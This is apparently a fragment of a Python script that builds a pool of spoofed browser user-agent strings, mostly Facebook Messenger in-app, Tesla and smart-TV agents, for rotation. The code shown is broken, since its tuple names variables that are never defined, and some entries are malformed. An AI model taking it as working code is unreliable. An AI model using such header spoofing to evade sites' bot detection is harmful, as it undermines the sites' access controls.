"Mozilla/5.0 (X11; CrOS x86_64 14469.41.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.57 Safari/537.36 Mozilla/5.0 (Linux; GoogleTV 3.2; LG Google TV G3 Build/MASTER) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Safari/534.24"
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1.23) Gecko/20090825 MultiZilla/1.8.3.4e SeaMonkey/1.1.18"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.12) Gecko/20080201 MultiZilla/1.8.3.4e SeaMonkey/1.1.8"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.16) Gecko/20080702 MultiZilla/1.8.3.4e SeaMonkey/1.1.11"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081204 MultiZilla/1.8.3.5c SeaMonkey/1.1.14"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.20.17-301e3e6efcc9"
"Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:1.9a1) Gecko/20051119 MultiZilla/1.8.1.0s SeaMonkey/1.5a"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.8) Gecko/20061030 MultiZilla/1.8.3.0a SeaMonkey/1.0.6"
"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.36.16-3e9e4e8dd287"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.36.10-010e3e5a2863"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.32.3-b9bd4364fd17"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.28.5-4a6fbab3952d"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) qutebrowser/1.13.1 QtWebEngine/5.14.2 Chrome/77.0.3865.129 Safari/537.36"
"Mozilla/5.0 (Linux mips; U;HbbTV/1.1.1 (+RTSP;Dream Property GmbH;Dreambox;0.1a;1.0;) CE-HTML/1.0; en) AppleWebKit/535.19 no/Volksbox QtWebkit/2.2"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.40.3-8dcf2c39be86"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/79.0.3945.130 Chrome/79.0.3945.130 Safari/537.36 Tesla/2020.40.4-ffa5212dba76"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) qutebrowser/2.4.0 QtWebEngine/5.15.6 Chrome/95.0.4628.2 Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) qutebrowser/2.1.1 QtWebEngine/5.15.3 Chrome/87.0.4280.144 Safari/537.36"
sd=(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv)
ugen.append(sd)
#_______________##____________#
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
"Mozilla/5.0 (iPad; CPU OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad6,12;FBMD/iPad;FBSN/iOS;FBSV/12.3.1;FBSS/2;FBCR/Swisscom;FBID/tablet;FBLC/fr_FR;FBOP/5]"
"/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/Beeline;FBID/phone;FBLC/ru_RU;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 [FBAN/MessengerForiOS;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2.6;FBSS/2;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 [FBAN/MessengerForiOS;FBAV/11.0.0.15.14;FBBV/4026123;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.1.2;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r"
"Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15F79 [FBAN/MessengerForiOS;FBAV/172.0.0.51.84;FBBV/115215338;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.4;FBSS/3;FBCR/Beeline;FBID/phone;FBLC/ru_RU;F"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Tele2;FBID/phone;FBLC/ru_RU;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/MessengerForiOS;FBAV/161.0.0.53.95;FBBV/102491769;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/2;FBCR/YOTA;FBID/phone;FBLC/ru_RU;F"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.2;FBSS/3;FBCR/Mobile TeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/MobileTeleSystems;FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/0]"
"Mozilla/5.0 (iPad; CPU OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPad5,4;FBMD/iPad;FBSN/iOS;FBSV/12.0.1;FBSS/2;FBCR/Beeline;FBID/tablet;FBLC/ru_RU;FBOP/5]"
"Mozilla/5.0 (Linux; U; Android 4.3; vi-vn; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/MESSENGER;FBAV/138.0.0.20.92;]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5]"
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/129.0.0.17.91;]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466 [FBAN/MessengerForiOS;FBAV/19.1.0.12.23;FBBV/6318336;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.1.3;FBSS/2; FBCR/MobileTeleSystems;FBID/pho"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/58.0.0.32.81;FBBV/22628760;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/ru_R"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/47.0.0.19.116;FBBV/17056928;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/de_"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/55.0.0.28.59;FBBV/20754519;FBDV/iPhone5,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/Carrier;FBID/phone;FBLC/r"
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B554a [FBAN/MessengerForiOS;FBAV/3.1.2;FBBV/1027309;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.0.4;FBSS/2; FBCR/MobileTeleSystems;FBID/phone;FB"
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B511 [FBAN/MessengerForiOS;FBAV/9.1.0.15.14;FBBV/3594432;FBDV/iPhone3,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.0.3;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/ru"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12F70 [FBAN/MessengerForiOS;FBAV/85.0.0.22.69;FBBV/37013644;FBRV/0;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.3;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/"
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/114.0.0.21.71;]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/99.0.0.31.139;FBBV/45331829;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Carrier;FBID/phone;FB"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 [FBAN/MessengerForiOS;FBAV/61.0.0.29.25;FBBV/24721691;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.2.1;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r"
"Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/50.0.0.15.72;FBBV/17975388;FBDV/iPad2,7;FBMD/iPad;FBSN/iPhone OS;FBSV/9.1;FBSS/1; FBCR/MobileTeleSystems;FBID/tablet;FBLC/ru_RU;"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]"
"Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 [FBAN/MessengerForiOS;FBAV/50.0.0.15.72;FBBV/17975388;FBDV/iPad2,7;FBMD/iPad;FBSN/iPhone OS;FBSV/9.1;FBSS/1; FBCR/MobileTeleSystems;FBID/tablet;FBLC/ru_RU;"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]"
"Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12D508 [FBAN/MessengerForiOS;FBAV/23.1.0.15.15;FBBV/8176219;FBDV/iPad4,4;FBMD/iPad;FBSN/iPhone OS;FBSV/8.2;FBSS/2; FBCR/;FBID/tablet;FBLC/ru_RU;FBOP/1]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 [FBAN/MessengerForiOS;FBAV/15.0.0.15.14;FBBV/4974699;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/7.1.2;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/r"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 [FBAN/MessengerForiOS;FBAV/64.0.0.28.84;FBBV/26403168;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.1;FBSS/2; FBCR/MegaFon;FBID/phone;FBLC/"
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/123.0.0.44.69;FBBV/62323340;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Mobifone;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/MessengerForiOS;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/112.0.0.36.70;FBBV/54364624;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Rogers;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone10,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/3;FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/120.0.0.48.70;FBBV/59774553;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.8;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12D508 [FBAN/MessengerForiOS;FBAV/25.0.0.4.14;FBBV/8936291;FBDV/iPhone5,3;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.2;FBSS/2; FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/143552906]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FBAN/MessengerForiOS;FBAV/209.0.0.33.90;FBBV/142900020;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.4;FBSS/2;FBCR/Vodafone.de;FBID/phone;FBLC/br_pt;FBOP/5;FBRV/143552906]"
"Mozilla/5.0 (iPad; CPU OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBAV/88.0.0.27.69;FBBV/38853002;FBRV/0;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.8;FBSS/2;FBCR/;FBID/tablet;FBLC/ru_RU;FBOP/5]"
"Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/221.1.0.15.157;] [ip:213.205.242.78]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/MessengerForiOS;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBID/phone;FBLC/vi_VN;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBAV/113.0.0.38.70;FBBV/54935425;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/Ooredoo;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.5;FBSS/2;FBID/phone;FBLC/fr_FR;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/13.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B440 [FBAN/MessengerForiOS;FBAV/34.0.0.21.276;FBBV/13810118;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.1.2;FBSS/2; FBCR/Globe;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/12.0;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/MessengerForiOS;FBAV/128.0.0.43.90;FBBV/66013621;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/Mobifone;FBID/phone;FBLC/vi_VN;FBOP/5;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.5;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBID/phone;FBLC/hu_HU;FBOP/5]"
"Mozilla/5.0 (Linux; Android 6.0.1; P01T_1 Build/MMB29P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.81 Safari/537.36 [FB_IAB/MESSENGER;FBAV/119.0.0.18.91;]"
"Mozilla/5.0 (iPad; CPU OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.5;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5]"
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D39 [FBAN/MessengerForiOS;FBAV/201.0.0.47.100;FBBV/141000120;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.3;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/es_LA;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBAV/191.0.0.54.98;FBBV/130377189;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.0;FBSS/2;FBCR/Free;FBID/phone;FBLC/fr_FR;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/191.0.0.54.98;FBBV/130377189;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/MetroPCS;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D39 [FBAN/MessengerForiOS;FBAV/200.0.0.27.103;FBBV/139866222;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.3;FBSS/2;FBCR/Telcel;FBID/phone;FBLC/es_LA;FBOP/5]"
"https://user-agents.net/string/mozilla-5-0-iphone-cpu-iphone-os-12-1-like-mac-os-x-applewebkit-605-1-15-khtml-like-gecko-mobile-16b92-fban-messengerforios-fbav-193-0-0-49-98-fbbv-132029873-fbdv-iphone7-2-fbmd-iphone-fbsn-ios-fbsv-12-1-fbss-2-fbcr-05226d6cc6ec3e9498b0a5669e90f7b6a497cbfd"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/pl_PL;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/MessengerForiOS;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/190.1.0.58.95;FBBV/129822925;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/MetroPCS;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15F79 [FBAN/MessengerForiOS;FBAV/201.0.0.47.100;FBBV/141000120;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.4;FBSS/3;FBCR/TRUE-H;FBID/phone;FBLC/th_TH;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]"
sd=(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv)
ugen.append(sd)
#_______________##____________#
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 43LJ594V-ZA; 06.10.35; 1; DTV_W17R); webOS.TV-2017; LG NetCast.TV-2013 Compatible (LGE, 43LJ594V-ZA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.41 (KHTML, like Gecko) Large Screen Safari/537.41 LG Browser/7.00.00(LGE; 47LB677V-ZC; 05.05.90; 1); webOS.TV-2014; LG NetCast.TV-2013 Compatible (LGE, 47LB677V-ZC, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/68.0.3440.106 Safari/537.36 LG Browser/8.00.00(LGE; 55UN74006LB; 04.50.52; 0x00000001; DTV_W20P); webOS.TV-2020; LG NetCast.TV-2013 Compatible (LGE, 55UN74006LB, wired)"
